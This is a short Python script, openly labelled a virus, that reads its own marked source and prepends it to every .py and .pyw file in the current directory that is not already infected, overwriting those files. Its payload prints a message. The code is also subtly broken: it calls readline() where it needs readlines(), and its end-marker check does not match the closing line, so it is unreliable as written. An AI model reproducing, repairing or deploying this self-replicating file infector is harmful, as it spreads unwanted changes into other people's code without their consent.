### START OF VIRUS ###

import sys,glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readline()

virus_are = False
for line in lines:
    if line == '### START OF VIRUS ###\n':
        virus_are = True
    if virus_are:
        code.append(line)
    if line == '### END OF VIRUS\n':
        break
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readline()

    infected = False
    for line in script_code:
        if line == '### START OF VIRUS ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)


        with open(script, 'w') as f:
            f.writelines(final_code)

# malicious plece of code (payload)
print("virus is infacted you ")

### END OF VIRUS ###
